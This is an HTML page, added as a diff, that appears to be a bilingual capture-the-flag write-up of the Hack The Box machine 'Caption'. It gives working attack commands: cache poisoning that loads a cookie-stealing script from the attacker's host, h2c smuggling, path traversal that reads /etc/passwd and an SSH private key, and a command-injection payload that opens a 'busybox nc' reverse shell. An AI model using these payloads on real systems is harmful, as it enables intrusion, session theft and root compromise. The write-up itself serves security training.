@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>caption | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">caption</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The attack chain began with reconnaissance revealing a GitBucket repository containing hardcoded credentials and HAProxy configuration details. Using these credentials, I accessed the Caption Portal and discovered a cache poisoning vulnerability in the <code>/firewall</code> endpoint through the unsanitized <code>X-Forwarded-Host</code> header.</p>
+                    
+                    <p>By poisoning the Varnish cache with an XSS payload, I stole the admin user's session token when they visited the cached page. With admin access, I needed to bypass HAProxy's restrictions on <code>/logs</code> and <code>/download</code> routes, which I achieved through HTTP/2 h2c request smuggling.</p>
+                    
+                    <p>The smuggled requests allowed me to access protected routes, where I discovered a CopyParty service running on localhost port 3923. Exploiting CVE-2024-31621 (path traversal in CopyParty), I read arbitrary files including Margo's SSH private key, granting initial shell access to the system.</p>
+                    
+                    <p>For privilege escalation, I identified an Apache Thrift service on port 9090 with a command injection vulnerability in its log processing functionality. By crafting a malicious log file and calling the service through a Thrift client, I injected commands that executed as root, obtaining a reverse shell with full system privileges.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Varnish cache poisoning, XSS via unsanitized headers, HTTP/2 h2c smuggling to bypass HAProxy, CopyParty path traversal (CVE-2024-31621), Apache Thrift service command injection.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports 22 (SSH), 80 (HTTP), and 8080 (HTTP)" /></p>
+
+                <p>The scan reveals three main services: SSH on port 22, HTTP on port 80, and another HTTP service on port 8080. I add <code>caption.htb</code> to my <code>/etc/hosts</code> file and begin web enumeration.</p>
+
+                <h2>Web Enumeration - Caption Portal</h2>
+                <p>Running <code>whatweb</code> against the target reveals interesting details about the web stack:</p>
+                <pre><code class="language-bash">whatweb http://caption.htb</code></pre>
+
+                <pre><code class="language-plaintext">http://caption.htb [200 OK] Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Werkzeug/3.0.1 Python/3.10.12], IP[10.10.11.33], 
+PasswordField[password], Python[3.10.12], Script, 
+Title[Caption Portal Login], UncommonHeaders[x-varnish], Varnish, 
+Via-Proxy[1.1 varnish (Varnish/6.6)], Werkzeug[3.0.1], 
+X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>The application is running Python with Flask and Werkzeug, and importantly, it's behind a Varnish caching proxy. This will be relevant later for cache poisoning attacks.</p>
+
+                <p>Port 80 presents a login portal, while port 8080 hosts a GitBucket instance containing the source code for two projects:</p>
+                <ul>
+                    <li><strong>Caption-Portal</strong> - The service running on port 80</li>
+                    <li><strong>Logservice</strong> - An internal logging service</li>
+                </ul>
+
+                <h2>GitBucket Source Code Analysis</h2>
+                <p>Reviewing the commit history in GitBucket, I discover hardcoded credentials in one of the commits:</p>
+                <pre><code class="language-plaintext">userlist AuthUsers
+user margo insecure-password vFr&cS2#0!</code></pre>
+
+                <p>The credentials <code>margo:vFr&cS2#0!</code> successfully authenticate to the Caption Portal, granting me initial access as a standard user.</p>
+
+                <h3>HAProxy Configuration Discovery</h3>
+                <p>Another interesting commit titled "Fixed HAProxyBypass" reveals the reverse proxy configuration:</p>
+                <pre><code class="language-plaintext">frontend http_front
+    bind *:80
+    default_backend http_back
+    
+    acl multi_slash path_reg -i ^/[/%]+
+    http-request deny if multi_slash
+    
+    acl restricted_page path_beg,url_dec -i /logs
+    acl restricted_page path_beg,url_dec -i /download
+    http-request deny if restricted_page
+    
+    acl not_caption hdr_beg(host) -i caption.htb</code></pre>
+
+                <p>This configuration reveals several critical details:</p>
+                <ul>
+                    <li>HAProxy is protecting the <code>/logs</code> and <code>/download</code> routes</li>
+                    <li>The backend technically has these routes exposed, suggesting a proxy bypass vulnerability</li>
+                    <li>There's path normalization protection against multiple slashes</li>
+                </ul>
+
+                <h2>Cache Poisoning via X-Forwarded-Host</h2>
+                <p>While exploring the authenticated portal, I notice something peculiar in the source code - it references <code>http://internal-proxy.local</code> for loading resources. This could be hardcoded, but it's more likely that it reads from a header.</p>
+
+                <p><img src="./media/image5.png" alt="Source code showing reference to internal-proxy.local for loading resources" /></p>
+
+                <p>Testing this theory, I add the <code>X-Forwarded-Host</code> header to my requests:</p>
+                <pre><code class="language-http">X-Forwarded-Host: http://localhost</code></pre>
+
+                <p>The URL changes in the response, confirming that the header is being processed:</p>
+                <p><img src="./media/image7.png" alt="Modified response showing the URL changed based on X-Forwarded-Host header" /></p>
+
+                <h3>Identifying the Cache Poisoning Vector</h3>
+                <p>The real vulnerability here is cache poisoning. I observe that:</p>
+                <ul>
+                    <li>The <code>X-Forwarded-Host</code> header is not sanitized</li>
+                    <li>The <code>/firewall</code> route is cached by Varnish for approximately 2 minutes</li>
+                    <li>Other routes like <code>/home</code> are not cached</li>
+                    <li>The cache status can be verified through the <code>Age</code> response header</li>
+                </ul>
+
+                <p><img src="./media/image3.png" alt="Response headers showing Age header indicating cached content and X-Varnish header" /></p>
+
+                <p>This means if I poison the cache with an XSS payload, any user visiting <code>/firewall</code> during the cache period will receive the poisoned version.</p>
+
+                <h3>Exploiting Cache Poisoning for XSS</h3>
+                <p>I craft a payload to steal session cookies by injecting JavaScript through the <code>X-Forwarded-Host</code> header:</p>
+                <p><img src="./media/image6.png" alt="Burp Suite request showing XSS payload in X-Forwarded-Host header to steal cookies" /></p>
+
+                <p>The payload causes the application to load a malicious script that exfiltrates session tokens:</p>
+                <pre><code class="language-http">X-Forwarded-Host: http://10.10.16.18:8000/evil.js</code></pre>
+
+                <p>After sending the poisoned request, I set up an HTTP server to receive the stolen cookies:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>When I visit <code>/firewall</code>, I receive my own session token (confirming the XSS works), and shortly after, I receive another session token from the target machine:</p>
+                <p><img src="./media/image4.png" alt="Browser showing the XSS payload executing and stealing session cookies" /></p>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.16.18 - - "GET /?sess=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
+10.10.11.33 - - "GET /?sess=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...</code></pre>
+
+                <p>Decoding the JWT token reveals it belongs to the <code>admin</code> user:</p>
+                <p><img src="./media/image8.png" alt="JWT decoder showing the token belongs to the admin user" /></p>
+
+                <p>I now have an admin session, but I still cannot access the protected <code>/logs</code> and <code>/download</code> routes due to HAProxy's restrictions.</p>
+
+                <h2>HTTP/2 h2c Request Smuggling</h2>
+                <p>To bypass HAProxy and access the restricted routes, I research proxy bypass techniques and discover HTTP/2 h2c smuggling. The attack is documented in this article: <a href="https://bishopfox.com/blog/h2c-smuggling-request">https://bishopfox.com/blog/h2c-smuggling-request</a></p>
+
+                <h3>Understanding h2c Smuggling</h3>
+                <p>The vulnerability works when:</p>
+                <ol>
+                    <li>The reverse proxy (HAProxy) doesn't block HTTP/2 upgrade requests</li>
+                    <li>The backend server accepts HTTP/2 connections</li>
+                    <li>The proxy and backend disagree on request boundaries</li>
+                </ol>
+
+                <p>Interestingly, HAProxy doesn't block HTTP/2 upgrades by default, making this attack possible. Manual exploitation is complex because it requires sending specific bytes after the HTTP/2 upgrade that cannot be easily crafted in Burp Suite.</p>
+
+                <p>I use the proof-of-concept tool from: <a href="https://github.com/BishopFox/h2csmuggler">https://github.com/BishopFox/h2csmuggler</a></p>
+
+                <h3>Bypassing HAProxy Restrictions</h3>
+                <p>Using the h2csmuggler tool with the admin session cookie, I can now access the protected <code>/logs</code> route:</p>
+                <pre><code class="language-bash">python3 h2csmuggler.py -x http://caption.htb \
+  http://caption.htb/logs \
+  -H 'Cookie: session={admin_jwt_token}'</code></pre>
+
+                <p><img src="./media/image2.png" alt="h2csmuggler output showing successful bypass of HAProxy restrictions to access /logs" /></p>
+
+                <p>The output shows two requests - the second one is the smuggled request that bypasses HAProxy. I discover the correct syntax for the <code>/download</code> route, which requires a <code>?url</code> query parameter.</p>
+
+                <h3>Discovering Internal Services</h3>
+                <p>Examining the log files, I find information about Margo's SSH authentication:</p>
+                <pre><code class="language-plaintext">Mar 6 09:16:59 caption sshd[1619]: Accepted publickey for margo 
+from 10.10.14.13 port 35916 ssh2: ECDSA 
+SHA256:ui/tjroDv1J8dgCcGNIaAr3QIk9BBLFDJVwiH9emcSQ</code></pre>
+
+                <p>This reveals that Margo uses ECDSA keys for SSH authentication instead of RSA.</p>
+
+                <p>Testing the <code>/download</code> endpoint, I attempt path traversal but find it's protected. However, I do discover an internal service running on port 3923:</p>
+                <pre><code class="language-html">&lt;a href="#" id="repl"&gt;π&lt;/a&gt;
+&lt;span id="pb"&gt;
+  &lt;span&gt;powered by&lt;/span&gt; 
+  &lt;a href="https://github.com/9001/copyparty"&gt;copyparty&lt;/a&gt;
+&lt;/span&gt;</code></pre>
+
+                <h2>Exploiting CopyParty Path Traversal (CVE-2024-31621)</h2>
+                <p>CopyParty is a file sharing service, and researching it reveals a path traversal vulnerability: <a href="https://github.com/9001/copyparty/security/advisories/GHSA-pxfv-7rr3-2qjg">CVE-2024-31621</a></p>
+
+                <p>The vulnerability allows reading arbitrary files through the <code>/.cpr/</code> path. The key trick is that the <code>%</code> character needs to be URL-encoded as <code>%25</code> because the request passes through multiple proxies.</p>
+
+                <h3>Reading System Files</h3>
+                <p>I first test by reading <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">python3 h2csmuggler.py -x http://caption.htb \
+  'http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd' \
+  -H 'Cookie: session={admin_jwt_token}'</code></pre>
+
+                <p>This successfully returns the passwd file, revealing two users with bash shells:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+margo:x:1000:1000:,,,:/home/margo:/bin/bash
+ruth:x:1001:1001:,,,:/home/ruth:/bin/bash</code></pre>
+
+                <h3>Stealing SSH Private Key</h3>
+                <p>Since I know Margo uses ECDSA keys for SSH, I attempt to read her private key:</p>
+                <pre><code class="language-bash">python3 h2csmuggler.py -x http://caption.htb \
+  'http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa' \
+  -H 'Cookie: session={admin_jwt_token}'</code></pre>
+
+                <p>The request successfully retrieves Margo's private SSH key. I save it locally, set proper permissions, and connect:</p>
+                <pre><code class="language-bash">chmod 600 id_ecdsa
+ssh -i id_ecdsa margo@10.10.11.33</code></pre>
+
+                <p>I now have shell access as Margo and can retrieve the user flag.</p>
+
+                <h2>Internal Enumeration</h2>
+                <p>After gaining initial access, I enumerate the system for privilege escalation vectors:</p>
+
+                <h3>Discovered Information</h3>
+                <ul>
+                    <li>Admin credentials in the web application: <code>admin:cFgjE@0%l0</code> (doesn't work for ruth or root)</li>
+                    <li>Ruth is a member of the <code>varnish</code> group</li>
+                    <li>SUID binary found: <code>/opt/google/chrome/chrome-sandbox</code></li>
+                </ul>
+
+                <h3>Ruth's Processes</h3>
+                <p>Checking running processes with <code>ps -faux</code>, I notice Ruth is running a script related to Varnish logging:</p>
+                <pre><code class="language-plaintext">ruth  1306  /bin/sh -c cd /home/ruth;bash varnish_logs.sh
+ruth  1312  bash varnish_logs.sh
+ruth  1317  varnishncsa -c -F %{VCL_Log:client_ip}x
+ruth  1318  bash varnish_logs.sh</code></pre>
+
+                <p>However, I don't have access to Ruth's home directory to examine these scripts.</p>
+
+                <h3>Internal Network Services</h3>
+                <p>Checking for locally listening ports reveals several interesting services:</p>
+                <pre><code class="language-plaintext">tcp  LISTEN  127.0.0.1:3923   # CopyParty
+tcp  LISTEN  127.0.0.1:8000   # Caption Portal backend
+tcp  LISTEN  127.0.0.1:6081   # Varnish
+tcp  LISTEN  127.0.0.1:6082   # Varnish admin
+tcp  LISTEN  127.0.0.1:9090   # Logservice</code></pre>
+
+                <p>Port 9090 catches my attention - it's the Logservice I saw earlier in GitBucket.</p>
+
+                <h2>Analyzing the Logservice Code</h2>
+                <p>Reviewing the Logservice source code in GitBucket, I identify a command injection vulnerability in the log processing logic:</p>
+                <pre><code class="language-go">ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
+// ...
+line := scanner.Text()
+ip := ipRegex.FindString(line)
+userAgentMatch := userAgentRegex.FindStringSubmatch(line)
+
+var userAgent string
+if len(userAgentMatch) > 1 {
+    userAgent = userAgentMatch[1]
+}
+
+timestamp := time.Now().Format(time.RFC3339)
+logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", 
+                     ip, userAgent, timestamp)
+exec.Command("/bin/sh", "-c", logs)</code></pre>
+
+                <p>The vulnerability is in the <code>User-Agent</code> parsing - it's not properly sanitized before being passed to <code>exec.Command</code>. By crafting a malicious log file with a specially crafted User-Agent field, I can inject arbitrary commands.</p>
+
+                <h3>Understanding Apache Thrift</h3>
+                <p>The service runs on Apache Thrift, which requires a specific protocol to communicate. In the GitBucket repository, I find a <code>.thrift</code> schema file:</p>
+                <pre><code class="language-thrift">namespace go log_service
+
+service LogService {
+    string ReadLogFile(1: string filePath)
+}</code></pre>
+
+                <p>This schema defines the interface for calling the service to read log files.</p>
+
+                <h2>Setting Up Thrift Client</h2>
+                <p>To interact with the Thrift service, I need to install dependencies and generate client code:</p>
+                <pre><code class="language-bash">pip3 install thrift
+sudo apt install thrift-compiler</code></pre>
+
+                <p>Then generate the Python client stubs:</p>
+                <pre><code class="language-bash">thrift -r --gen py log_service.thrift</code></pre>
+
+                <p>I use Claude AI to generate a Python client script that connects to the Thrift service on port 9090. The generated client allows me to call the <code>ReadLogFile</code> function with a file path.</p>
+
+                <h3>Testing the Thrift Client</h3>
+                <p>First, I test with a non-existent file to confirm the service is working:</p>
+                <pre><code class="language-bash">python3 client.py asd</code></pre>
+
+                <pre><code class="language-plaintext">Error: Internal error processing ReadLogFile: 
+error opening log file: open asd: no such file or directory</code></pre>
+
+                <p>Then with an existing file:</p>
+                <pre><code class="language-bash">python3 client.py /etc/passwd</code></pre>
+
+                <pre><code class="language-plaintext">Log file contents:
+Log file processed</code></pre>
+
+                <p>The service successfully processes the file, confirming I can interact with it.</p>
+
+                <h2>Exploiting Command Injection for Root Access</h2>
+                <p>Now that I can call the Logservice, I exploit the command injection vulnerability by crafting a malicious log file.</p>
+
+                <h3>Creating the Malicious Payload</h3>
+                <p>As user Margo, I create a file <code>/tmp/xd.txt</code> with the following content:</p>
+                <pre><code class="language-json">{"user-agent":"' && curl 10.10.16.18:8000 && echo '"}</code></pre>
+
+                <p>When the service processes this file, the <code>logs</code> variable will become:</p>
+                <pre><code class="language-bash">echo 'IP Address:, User-Agent: ' && curl 10.10.16.18:8000 && echo ', Timestamp: ...' >> output.log</code></pre>
+
+                <p>This breaks out of the echo command and executes the injected <code>curl</code> command. I test the proof-of-concept:</p>
+                <pre><code class="language-bash">python3 client.py /tmp/xd.txt</code></pre>
+
+                <p>On my HTTP server, I receive the request:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.33 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>The command injection works! Now I modify the payload to get a reverse shell.</p>
+
+                <h3>Getting Root Shell</h3>
+                <p>I update the payload in <code>/tmp/xd.txt</code> to execute a reverse shell:</p>
+                <pre><code class="language-json">{"user-agent":"' && busybox nc 10.10.16.18 443 -e sh 0>&1 && echo '"}</code></pre>
+
+                <p>I use <code>busybox nc</code> because the standard reverse shell one-liners weren't working in this environment. I set up a netcat listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Then execute the Thrift client to trigger the injection:</p>
+                <pre><code class="language-bash">python3 client.py /tmp/xd.txt</code></pre>
+
+                <p>I receive a connection and verify root access:</p>
+                <pre><code class="language-bash">whoami
+root
+
+cat /root/root.txt</code></pre>
+
+                <p>I successfully escalated to root and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La cadena de ataque comenzó con un reconocimiento que reveló un repositorio GitBucket conteniendo credenciales hardcodeadas y detalles de configuración de HAProxy. Usando estas credenciales, accedí al Caption Portal y descubrí una vulnerabilidad de cache poisoning en el endpoint <code>/firewall</code> a través del header <code>X-Forwarded-Host</code> no sanitizado.</p>
+                    
+                    <p>Envenenando la caché de Varnish con un payload XSS, robé el token de sesión del usuario admin cuando visitó la página cacheada. Con acceso de administrador, necesitaba hacer bypass de las restricciones de HAProxy en las rutas <code>/logs</code> y <code>/download</code>, lo cual conseguí mediante HTTP/2 h2c request smuggling.</p>
+                    
+                    <p>Las peticiones smuggled me permitieron acceder a rutas protegidas, donde descubrí un servicio CopyParty ejecutándose en el puerto local 3923. Explotando CVE-2024-31621 (path traversal en CopyParty), pude leer archivos arbitrarios incluyendo la clave SSH privada de Margo, obteniendo acceso shell inicial al sistema.</p>
+                    
+                    <p>Para la escalada de privilegios, identifiqué un servicio Apache Thrift en el puerto 9090 con una vulnerabilidad de inyección de comandos en su funcionalidad de procesamiento de logs. Creando un archivo de log malicioso y llamando al servicio mediante un cliente Thrift, inyecté comandos que se ejecutaron como root, obteniendo una reverse shell con privilegios completos del sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Varnish cache poisoning, XSS mediante headers no sanitizados, HTTP/2 h2c smuggling para bypass de HAProxy, CopyParty path traversal (CVE-2024-31621), inyección de comandos en servicio Apache Thrift.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en el objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo nmap mostrando puertos abiertos 22 (SSH), 80 (HTTP) y 8080 (HTTP)" /></p>
+
+                <p>El escaneo revela tres servicios principales: SSH en el puerto 22, HTTP en el puerto 80, y otro servicio HTTP en el puerto 8080. Añado <code>caption.htb</code> a mi archivo <code>/etc/hosts</code> y comienzo la enumeración web.</p>
+
+                <h2>Enumeración Web - Caption Portal</h2>
+                <p>Ejecutando <code>whatweb</code> contra el objetivo revela detalles interesantes sobre el stack web:</p>
+                <pre><code class="language-bash">whatweb http://caption.htb</code></pre>
+
+                <pre><code class="language-plaintext">http://caption.htb [200 OK] Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Werkzeug/3.0.1 Python/3.10.12], IP[10.10.11.33], 
+PasswordField[password], Python[3.10.12], Script, 
+Title[Caption Portal Login], UncommonHeaders[x-varnish], Varnish, 
+Via-Proxy[1.1 varnish (Varnish/6.6)], Werkzeug[3.0.1], 
+X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>La aplicación ejecuta Python con Flask y Werkzeug, y lo importante es que está detrás de un proxy de caché Varnish. Esto será relevante más adelante para ataques de cache poisoning.</p>
+
+                <p>El puerto 80 presenta un portal de login, mientras que el puerto 8080 aloja una instancia de GitBucket conteniendo el código fuente de dos proyectos:</p>
+                <ul>
+                    <li><strong>Caption-Portal</strong> - El servicio ejecutándose en el puerto 80</li>
+                    <li><strong>Logservice</strong> - Un servicio de logging interno</li>
+                </ul>
+
+                <h2>Análisis del Código Fuente en GitBucket</h2>
+                <p>Revisando el historial de commits en GitBucket, descubro credenciales hardcodeadas en uno de los commits:</p>
+                <pre><code class="language-plaintext">userlist AuthUsers
+user margo insecure-password vFr&cS2#0!</code></pre>
+
+                <p>Las credenciales <code>margo:vFr&cS2#0!</code> autentican exitosamente en el Caption Portal, otorgándome acceso inicial como usuario estándar.</p>
+
+                <h3>Descubrimiento de Configuración de HAProxy</h3>
+                <p>Otro commit interesante titulado "Fixed HAProxyBypass" revela la configuración del reverse proxy:</p>
+                <pre><code class="language-plaintext">frontend http_front
+    bind *:80
+    default_backend http_back
+    
+    acl multi_slash path_reg -i ^/[/%]+
+    http-request deny if multi_slash
+    
+    acl restricted_page path_beg,url_dec -i /logs
+    acl restricted_page path_beg,url_dec -i /download
+    http-request deny if restricted_page
+    
+    acl not_caption hdr_beg(host) -i caption.htb</code></pre>
+
+                <p>Esta configuración revela varios detalles críticos:</p>
+                <ul>
+                    <li>HAProxy está protegiendo las rutas <code>/logs</code> y <code>/download</code></li>
+                    <li>El backend técnicamente tiene estas rutas expuestas, sugiriendo una vulnerabilidad de proxy bypass</li>
+                    <li>Hay protección de normalización de rutas contra múltiples barras</li>
+                </ul>
+
+                <h2>Cache Poisoning mediante X-Forwarded-Host</h2>
+                <p>Mientras exploro el portal autenticado, noto algo peculiar en el código fuente - referencia <code>http://internal-proxy.local</code> para cargar recursos. Esto podría estar hardcodeado, pero es más probable que lea de un header.</p>
+
+                <p><img src="./media/image5.png" alt="Código fuente mostrando referencia a internal-proxy.local para cargar recursos" /></p>
+
+                <p>Probando esta teoría, añado el header <code>X-Forwarded-Host</code> a mis peticiones:</p>
+                <pre><code class="language-http">X-Forwarded-Host: http://localhost</code></pre>
+
+                <p>La URL cambia en la respuesta, confirmando que el header está siendo procesado:</p>
+                <p><img src="./media/image7.png" alt="Respuesta modificada mostrando la URL cambiada basándose en el header X-Forwarded-Host" /></p>
+
+                <h3>Identificando el Vector de Cache Poisoning</h3>
+                <p>La vulnerabilidad real aquí es el cache poisoning. Observo que:</p>
+                <ul>
+                    <li>El header <code>X-Forwarded-Host</code> no está sanitizado</li>
+                    <li>La ruta <code>/firewall</code> es cacheada por Varnish durante aproximadamente 2 minutos</li>
+                    <li>Otras rutas como <code>/home</code> no se cachean</li>
+                    <li>El estado de la caché se puede verificar mediante el header de respuesta <code>Age</code></li>
+                </ul>
+
+                <p><img src="./media/image3.png" alt="Headers de respuesta mostrando el header Age indicando contenido cacheado y header X-Varnish" /></p>
+
+                <p>Esto significa que si enveneno la caché con un payload XSS, cualquier usuario que visite <code>/firewall</code> durante el periodo de caché recibirá la versión envenenada.</p>
+
+                <h3>Explotando Cache Poisoning para XSS</h3>
+                <p>Creo un payload para robar cookies de sesión inyectando JavaScript a través del header <code>X-Forwarded-Host</code>:</p>
+                <p><img src="./media/image6.png" alt="Petición de Burp Suite mostrando payload XSS en header X-Forwarded-Host para robar cookies" /></p>
+
+                <p>El payload hace que la aplicación cargue un script malicioso que exfiltra tokens de sesión:</p>
+                <pre><code class="language-http">X-Forwarded-Host: http://10.10.16.18:8000/evil.js</code></pre>
+
+                <p>Después de enviar la petición envenenada, configuro un servidor HTTP para recibir las cookies robadas:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>Cuando visito <code>/firewall</code>, recibo mi propio token de sesión (confirmando que el XSS funciona), y poco después, recibo otro token de sesión desde la máquina objetivo:</p>
+                <p><img src="./media/image4.png" alt="Navegador mostrando el payload XSS ejecutándose y robando cookies de sesión" /></p>
+
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.16.18 - - "GET /?sess=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
+10.10.11.33 - - "GET /?sess=session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...</code></pre>
+
+                <p>Decodificando el token JWT revela que pertenece al usuario <code>admin</code>:</p>
+                <p><img src="./media/image8.png" alt="Decodificador JWT mostrando que el token pertenece al usuario admin" /></p>
+
+                <p>Ahora tengo una sesión de admin, pero todavía no puedo acceder a las rutas protegidas <code>/logs</code> y <code>/download</code> debido a las restricciones de HAProxy.</p>
+
+                <h2>HTTP/2 h2c Request Smuggling</h2>
+                <p>Para hacer bypass de HAProxy y acceder a las rutas restringidas, investigo técnicas de proxy bypass y descubro HTTP/2 h2c smuggling. El ataque está documentado en este artículo: <a href="https://bishopfox.com/blog/h2c-smuggling-request">https://bishopfox.com/blog/h2c-smuggling-request</a></p>
+
+                <h3>Entendiendo h2c Smuggling</h3>
+                <p>La vulnerabilidad funciona cuando:</p>
+                <ol>
+                    <li>El reverse proxy (HAProxy) no bloquea peticiones de upgrade a HTTP/2</li>
+                    <li>El servidor backend acepta conexiones HTTP/2</li>
+                    <li>El proxy y el backend no están de acuerdo en los límites de las peticiones</li>
+                </ol>
+
+                <p>Curiosamente, HAProxy no bloquea upgrades a HTTP/2 por defecto, haciendo este ataque posible. La explotación manual es compleja porque requiere enviar bytes específicos después del upgrade a HTTP/2 que no se pueden fabricar fácilmente en Burp Suite.</p>
+
+                <p>Uso la herramienta de prueba de concepto de: <a href="https://github.com/BishopFox/h2csmuggler">https://github.com/BishopFox/h2csmuggler</a></p>
+
+                <h3>Haciendo Bypass de las Restricciones de HAProxy</h3>
+                <p>Usando la herramienta h2csmuggler con la cookie de sesión del admin, ahora puedo acceder a la ruta protegida <code>/logs</code>:</p>
+                <pre><code class="language-bash">python3 h2csmuggler.py -x http://caption.htb \
+  http://caption.htb/logs \
+  -H 'Cookie: session={admin_jwt_token}'</code></pre>
+
+                <p><img src="./media/image2.png" alt="Salida de h2csmuggler mostrando bypass exitoso de restricciones de HAProxy para acceder a /logs" /></p>
+
+                <p>La salida muestra dos peticiones - la segunda es la petición smuggled que hace bypass de HAProxy. Descubro la sintaxis correcta para la ruta <code>/download</code>, que requiere un parámetro de query <code>?url</code>.</p>
+
+                <h3>Descubriendo Servicios Internos</h3>
+                <p>Examinando los archivos de log, encuentro información sobre la autenticación SSH de Margo:</p>
+                <pre><code class="language-plaintext">Mar 6 09:16:59 caption sshd[1619]: Accepted publickey for margo 
+from 10.10.14.13 port 35916 ssh2: ECDSA 
+SHA256:ui/tjroDv1J8dgCcGNIaAr3QIk9BBLFDJVwiH9emcSQ</code></pre>
+
+                <p>Esto revela que Margo usa claves ECDSA para autenticación SSH en lugar de RSA.</p>
+
+                <p>Probando el endpoint <code>/download</code>, intento path traversal pero encuentro que está protegido. Sin embargo, sí descubro un servicio interno ejecutándose en el puerto 3923:</p>
+                <pre><code class="language-html">&lt;a href="#" id="repl"&gt;π&lt;/a&gt;
+&lt;span id="pb"&gt;
+  &lt;span&gt;powered by&lt;/span&gt; 
+  &lt;a href="https://github.com/9001/copyparty"&gt;copyparty&lt;/a&gt;
+&lt;/span&gt;</code></pre>
+
+                <h2>Explotando CopyParty Path Traversal (CVE-2024-31621)</h2>
+                <p>CopyParty es un servicio de compartición de archivos, y al investigarlo revela una vulnerabilidad de path traversal: <a href="https://github.com/9001/copyparty/security/advisories/GHSA-pxfv-7rr3-2qjg">CVE-2024-31621</a></p>
+
+                <p>La vulnerabilidad permite leer archivos arbitrarios a través de la ruta <code>/.cpr/</code>. El truco clave es que el carácter <code>%</code> necesita estar URL-encodeado como <code>%25</code> porque la petición pasa a través de múltiples proxies.</p>
+
+                <h3>Leyendo Archivos del Sistema</h3>
+                <p>Primero pruebo leyendo <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">python3 h2csmuggler.py -x http://caption.htb \
+  'http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fetc%252Fpasswd' \
+  -H 'Cookie: session={admin_jwt_token}'</code></pre>
+
+                <p>Esto devuelve exitosamente el archivo passwd, revelando dos usuarios con shells bash:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+margo:x:1000:1000:,,,:/home/margo:/bin/bash
+ruth:x:1001:1001:,,,:/home/ruth:/bin/bash</code></pre>
+
+                <h3>Robando Clave SSH Privada</h3>
+                <p>Ya que sé que Margo usa claves ECDSA para SSH, intento leer su clave privada:</p>
+                <pre><code class="language-bash">python3 h2csmuggler.py -x http://caption.htb \
+  'http://caption.htb/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252Fmargo%252F.ssh%252Fid_ecdsa' \
+  -H 'Cookie: session={admin_jwt_token}'</code></pre>
+
+                <p>La petición recupera exitosamente la clave SSH privada de Margo. La guardo localmente, establezco permisos apropiados y me conecto:</p>
+                <pre><code class="language-bash">chmod 600 id_ecdsa
+ssh -i id_ecdsa margo@10.10.11.33</code></pre>
+
+                <p>Ahora tengo acceso shell como Margo y puedo recuperar la flag de usuario.</p>
+
+                <h2>Enumeración Interna</h2>
